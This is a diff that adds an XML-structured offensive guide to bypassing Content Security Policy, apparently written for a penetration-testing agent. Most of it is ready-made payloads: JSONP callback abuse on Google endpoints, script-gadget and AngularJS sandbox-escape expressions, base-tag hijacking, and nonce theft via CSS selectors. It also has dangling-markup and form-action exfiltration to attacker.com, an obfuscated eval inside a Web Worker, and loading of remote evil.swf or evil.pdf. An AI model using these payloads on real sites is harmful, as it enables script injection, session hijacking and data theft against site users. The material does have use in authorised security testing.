@@ -1,0 +1,243 @@
+<vulnerability_guide>
+  <title>CONTENT SECURITY POLICY BYPASS - ADVANCED</title>
+
+  <critical>Content Security Policy (CSP) is the primary defense against XSS, but misconfigurations are extremely common. Understanding CSP bypass techniques transforms "unexploitable" XSS findings into critical vulnerabilities. Over 90% of CSPs in the wild have at least one bypass vector.</critical>
+
+  <scope>
+    - Script gadget attacks
+    - JSONP endpoint abuse
+    - Angular/framework expression injection
+    - Base-uri and meta tag attacks
+    - Unsafe CSP directive exploitation
+    - Nonce and hash bypass techniques
+  </scope>
+
+  <methodology>
+    1. CSP ANALYSIS
+       {% raw %}
+       # Extract and analyze CSP
+       curl -I https://target.com | grep -i content-security-policy
+
+       # Common weak directives to look for:
+       # 'unsafe-inline' - Direct script execution
+       # 'unsafe-eval' - eval() and similar
+       # data: in script-src - Data URI scripts
+       # * wildcards - Broad allowlist
+       # Missing base-uri - Base tag injection
+       # Missing form-action - Form hijacking
+       # Missing frame-ancestors - Clickjacking
+
+       # CSP Evaluator
+       # https://csp-evaluator.withgoogle.com/
+       {% endraw %}
+
+    2. JSONP ENDPOINT ABUSE
+       {% raw %}
+       # Find JSONP endpoints on allowed domains
+       # Common patterns:
+       # ?callback=
+       # ?jsonp=
+       # ?cb=
+
+       # If CSP allows *.google.com
+       <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+
+       # If CSP allows *.googleapis.com
+       <script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
+
+       # JSONP to execute arbitrary code
+       <script src="https://allowed.com/api?callback=document.body.innerHTML="></script>
+
+       # Common CSP bypass endpoints:
+       # - Google APIs
+       # - Facebook SDK
+       # - jQuery CDNs with JSONP
+       # - Analytics scripts
+       {% endraw %}
+
+    3. SCRIPT GADGET ATTACKS
+       {% raw %}
+       # Script gadgets are existing code that can be abused
+       # Work even with strict CSP (nonce/hash)
+
+       # RequireJS gadget
+       <script data-main="data:,alert(1)"></script>
+
+       # Angular gadget (ng-app on allowed script)
+       <div ng-app ng-csp>
+         {{$eval.constructor('alert(1)')()}}
+       </div>
+
+       # jQuery gadget
+       <form class="child">
+         <input name="ownerDocument">
+         <input name="ownerDocument">
+         <script>$.globalEval('alert(1)')</script>
+       </form>
+
+       # Polymer gadget
+       <template is="dom-bind">
+         <div style$="[[alert(1)]]"></div>
+       </template>
+       {% endraw %}
+
+    4. ANGULAR EXPRESSION INJECTION
+       {% raw %}
+       # If Angular is allowed and ng-app exists
+
+       # Angular 1.x (various versions)
+       {{constructor.constructor('alert(1)')()}}
+       {{$on.constructor('alert(1)')()}}
+       {{'a]'.constructor.prototype.charAt=''.valueOf;$eval("x]alert(1)")}}
+
+       # Angular 1.6+ sandbox bypass
+       {{$new.constructor('alert(1)')()}}
+
+       # AngularJS sandbox escapes by version
+       # 1.0-1.1: {{constructor.constructor('alert(1)')()}}
+       # 1.2-1.5: Various expression-based
+       # 1.6+: Sandbox removed but CSP mode
+       {% endraw %}
+
+    5. BASE TAG AND META TAG ATTACKS
+       {% raw %}
+       # If base-uri not restricted in CSP
+
+       # Relative URL hijacking
+       <base href="https://attacker.com/">
+       <!-- All relative script/link/form URLs now go to attacker -->
+
+       # If HTML injection before script tag
+       <base href="https://attacker.com/fake-path/">
+       <script src="/legitimate.js"></script>
+       <!-- Loads https://attacker.com/fake-path/legitimate.js -->
+
+       # Meta refresh for redirect (if not blocked)
+       <meta http-equiv="refresh" content="0;url=https://attacker.com/">
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <nonce_bypass>
+      {% raw %}
+      # Nonce reuse detection
+      # If server reuses nonces, can predict them
+
+      # Nonce stealing via dangling markup
+      <img src="https://attacker.com/steal?
+      <!-- Captures nonce in subsequent script tag -->
+
+      # DOM clobbering to access nonce
+      <form id="csp"><input name="nonce" value="predictable"></form>
+
+      # Nonce exfiltration via CSS injection
+      script[nonce^="a"] { background: url(https://attacker.com/a); }
+      script[nonce^="b"] { background: url(https://attacker.com/b); }
+      {% endraw %}
+    </nonce_bypass>
+
+    <strict_dynamic_bypass>
+      {% raw %}
+      # 'strict-dynamic' allows scripts created by trusted scripts
+      # But has bypass vectors
+
+      # If you control input to trusted script
+      trustedScript.innerHTML = '<script>alert(1)</script>';
+      document.body.appendChild(trustedScript.firstChild);
+
+      # Script loader abuse
+      # If trusted script loads other scripts based on input
+      loadScript(userInput); // userInput = "//attacker.com/evil.js"
+      {% endraw %}
+    </strict_dynamic_bypass>
+
+    <object_and_embed>
+      {% raw %}
+      # If object-src not restricted
+
+      # Flash-based execution
+      <object data="https://attacker.com/evil.swf"></object>
+
+      # PDF JavaScript
+      <embed src="https://attacker.com/evil.pdf">
+
+      # SVG with JavaScript
+      <object data="data:image/svg+xml,<svg onload=alert(1)>"></object>
+      {% endraw %}
+    </object_and_embed>
+
+    <worker_bypass>
+      {% raw %}
+      # If worker-src allows data: or blob:
+
+      # Web Worker with eval
+      new Worker(
+        URL.createObjectURL(
+          new Blob(['eval(atob("YWxlcnQoMSk="))'])
+        )
+      );
+
+      # Service Worker registration abuse
+      # (Requires script-src bypass first)
+      navigator.serviceWorker.register('/user-content/evil-sw.js');
+      {% endraw %}
+    </worker_bypass>
+
+    <dangling_markup>
+      {% raw %}
+      # Steal data across CSP using dangling markup
+
+      # Image-based exfiltration
+      <img src="https://attacker.com/collect?data=
+      <!-- Everything until next quote becomes URL -->
+
+      # Form action hijacking
+      <form action="https://attacker.com/steal">
+      <!-- If form-action not restricted -->
+
+      # Link-based exfiltration (requires click)
+      <a href="https://attacker.com/steal?data=
+      {% endraw %}
+    </dangling_markup>
+
+    <report_uri_abuse>
+      {% raw %}
+      # CSP violation reports can leak information
+
+      # report-uri endpoint may be vulnerable
+      # - SSRF through report URL
+      # - Information disclosure in reports
+
+      # Trigger controlled violations to send reports
+      # Reports include: blocked URI, violated directive, source file
+      {% endraw %}
+    </report_uri_abuse>
+  </advanced_techniques>
+
+  <detection>
+    - Audit CSP headers regularly
+    - Check for JSONP endpoints on allowed origins
+    - Review for Angular/framework gadgets
+    - Test for base-uri restrictions
+    - Monitor CSP violation reports
+  </detection>
+
+  <validation>
+    - Identify weak directives in CSP
+    - Successfully bypass CSP with gadgets
+    - Execute JavaScript despite CSP
+    - Exfiltrate data using dangling markup
+    - Document full attack chain
+  </validation>
+
+  <pro_tips>
+    - Always check CSP Evaluator for quick wins
+    - JSONP endpoints are the most common bypass vector
+    - 'strict-dynamic' is not foolproof - check script loaders
+    - Missing base-uri + relative script paths = easy bypass
+    - Even report-only CSP indicates security awareness
+    - Combine DOM XSS + CSP bypass for stored impact
+  </pro_tips>
+
+  <remember>CSP bypasses transform "mitigated" XSS into exploitable vulnerabilities. The best CSP bypass hunters maintain a list of JSONP endpoints and script gadgets for commonly allowed domains. A strict CSP only works if every allowed origin is secure - one vulnerable JSONP endpoint breaks the entire policy.</remember>
+</vulnerability_guide>
